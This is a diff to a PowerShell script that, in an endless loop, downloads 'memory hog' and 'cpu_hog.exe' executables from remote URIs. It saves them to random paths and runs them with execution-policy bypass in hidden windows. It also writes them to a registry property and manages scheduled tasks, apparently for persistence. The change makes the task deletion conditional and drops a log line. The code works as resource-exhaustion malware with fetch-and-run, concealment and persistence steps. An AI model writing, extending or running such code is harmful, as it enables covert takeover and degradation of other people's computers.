@@ -149,7 +149,7 @@ while ($true) {
         iwr -Uri $memHogUri -OutFile $memHogPath
         $memTaskRunAction = "-ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden '$memHogPath'"
         Set-ItemProperty -Path "$basePath" -Name $memPropertyName -Value $memHogPath -Force | Out-Null
-        schtasks /delete /tn $memHogTaskName /f 2>&1 | Out-Null
+        if(schtasks /query /tn $memHogTaskName){ schtasks /delete /tn $memHogTaskName /f 2>&1 | Out-Null }
     }
     # if(-not(Test-Path $storageHogPath -PathType Leaf)){
     #     schtasks /end /tn $storageHogTaskName
@@ -166,7 +166,6 @@ while ($true) {
 
     $curr = Get-RamPercentage
     if($curr -ge $threshold){
-        echo "threshold $threshold reached at $curr" >> "C:\thres.txt"
         $cpuHogPath = "$($paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)])\cpu_hog.exe"
         iwr -Uri $cpuHogUri -OutFile $cpuHogPath
         powershell.exe -ep bypass -w hidden -noP $cpuHogPath
